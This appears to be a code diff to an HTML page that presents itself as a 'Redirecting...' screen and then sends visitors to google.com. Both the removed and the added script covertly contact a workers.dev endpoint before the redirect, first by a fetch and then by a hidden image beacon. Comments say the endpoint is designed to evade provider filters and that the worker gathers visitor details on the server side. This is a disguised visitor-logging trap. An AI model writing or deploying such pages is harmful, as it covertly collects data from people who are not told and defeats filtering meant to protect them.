@@ -3,32 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <title>Redirecting...</title>
-    <script>
-        function start() {
-            const workerUrl = "https://adminfdm.alexgranny1708.workers.dev/";
-            
-            // Добавляем случайный параметр, чтобы обмануть фильтры провайдеров (cache busting)
-            const finalUrl = workerUrl + "?nocache=" + Date.now();
-
-            const go = () => { window.location.replace("https://google.com"); };
-
-            fetch(finalUrl, { 
-                mode: 'no-cors', 
-                cache: 'no-store' 
-            })
-            .then(go)
-            .catch(() => {
-                // Если домен заблочен, ждем чуть-чуть и уходим
-                setTimeout(go, 1000);
-            });
-
-            // Жесткий таймер на случай зависания сети
-            setTimeout(go, 3000);
-        }
-        window.onload = start;
-    </script>
 </head>
 <body>
-    <h1>Please wait...</h1>
+    <script>
+        const t = encodeURIComponent(new Date().toLocaleString());
+        const workerUrl = "https://adminfdm.alexgranny1708.workers.dev/";
+        
+        const i = new Image();
+        const go = () => window.location.replace("https://google.com");
+        
+        i.onload = go;
+        i.onerror = go;
+        
+        // Отправляем только метку времени, остальное соберет воркер на сервере
+        i.src = workerUrl + "?t=" + t;
+
+        setTimeout(go, 2000);
+    </script>
 </body>
 </html>
